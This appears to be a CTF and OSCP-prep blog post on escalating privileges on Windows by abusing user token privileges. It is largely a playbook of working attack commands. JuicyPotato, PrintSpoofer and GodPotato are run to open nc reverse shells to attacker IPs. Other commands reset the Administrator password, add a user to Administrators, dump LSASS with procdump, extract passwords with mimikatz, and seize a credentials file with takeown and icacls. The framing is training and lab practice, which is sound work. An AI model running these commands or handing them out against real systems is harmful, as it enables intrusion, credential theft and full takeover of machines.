---
title: "Abusing User Privileges"
date: 2025-08-08
categories: ["CTF", "OSCP Prep", "Windows", "PE"]
tags: ["Windows", "Windows User Privileges", "privilege escalation", "SeImpersonate", "SeTakeOwnershipPrivilege", "SeDebugPrivilege"]
description: "Techniques with guides on how to exploit Windows User Privileges to elevate privileges"
---

### Abusing Windows User Privileges

This guide explores common Windows user privileges and their potential abuse for privilege escalation during penetration testing or CTF challenges. Each privilege is explained alongside exploitation methods and examples.

---
---

## **SeImpersonate and SeAssignPrimaryToken**

**Overview**: These privileges allow a user to impersonate another user or assign a primary token to a process. Commonly abused by services running under `LOCAL SERVICE`, `NETWORK SERVICE`, or application service accounts.

**Key Notes:**

- Groups that have `SeImpersonate` by default include:
  - Administrators
  - LOCAL SERVICE
  - NETWORK SERVICE
  - SERVICE

- Check for `SeImpersonate` after gaining RCE via applications running under service accounts (e.g., web shells, Jenkins, MSSQL). Tools like [JuicyPotato](https://github.com/ohpe/juicy-potato) exploit these privileges using DCOM/NTLM reflection.

---

## **SeImpersonate Example - JuicyPotato**

**Scenario**: Achieved RCE on a SQL server running as a service account with `SeImpersonate`.

**Steps:**

1. **Gain Initial Access:**
   ```bash
   python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sql_dev@10.129.43.30 -windows-auth
   SQL> enable_xp_cmdshell
   SQL> xp_cmdshell whoami
   SQL> xp_cmdshell whoami /priv
   ```

2. **Privilege Escalation with JuicyPotato:**
   - Upload `JuicyPotato.exe` and `nc.exe`:
     ```bash
     wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
     xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.208 8443 -e cmd.exe" -t *
     ```

   - On the attacker machine:
     ```bash
     sudo nc -nvlp 8443
     ```

---

## **PrintSpoofer,RoguePotato GodPotato**

`PrintSpoofer` and `RoguePotato` as well as GodPotato are alternatives to `JuicyPotato` for systems where it doesn’t work (e.g., Windows Server 2019+).

**Example using PrintSpoofer:**

1. Upload `PrintSpoofer.exe` and `nc.exe`:
   ```bash
   wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
   ```

2. Execute a reverse shell:
   ```bash
   xp_cmdshell c:\tools\PrintSpoofer64.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
   ```

3. Listen on the attacker machine:
   ```bash
   sudo nc -nvlp 8443
   ```

## GodPotato
```cmd
Resource: github.com/BeichenDream/GodPotato/releases

# Check if it works
GodPotato -cmd "cmd /c whoami"


# Reverse Shell
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.49.116 80"

# If it does not work try change the Administrator password
GodPotato -cmd "cmd /c net user Administrator dotpirate"
```

# SigmaPotato
```cmd
.\SigmaPotato "net localgroup Administrators dave4 /add"
```


---
---


## **SeDebugPrivilege**

**Overview**: This privilege enables users to debug processes and capture sensitive information like passwords from memory.

**Exploitation Steps:**

1. **Dump LSASS Memory:**
   - Use `ProcDump`:
     ```cmd
     procdump.exe -accepteula -ma lsass.exe lsass.dmp
     ```

   - Or via Task Manager (if RDP is available): Right-click `LSASS` in the Details tab and select `Create Dump File`.

2. **Extract Credentials with Mimikatz:**
   ```cmd
   mimikatz.exe
   sekurlsa::minidump lsass.dmp
   sekurlsa::logonPasswords
   ```

---
---

## **SeTakeOwnershipPrivilege**

**Overview**: Grants a user the ability to take ownership of files, folders, registry keys, and other objects. Users can then modify permissions or read sensitive files.

**Example:**

1. **Check Privilege:**
   ```cmd
   whoami /priv
   ```

2. **Take Ownership:**
   ```cmd
   takeown /f 'C:\Department Shares\Private\IT\cred.txt'
   ```

3. **Modify ACL to Gain Full Access:**
   ```cmd
   icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
   cat 'C:\Department Shares\Private\IT\cred.txt'
   ```
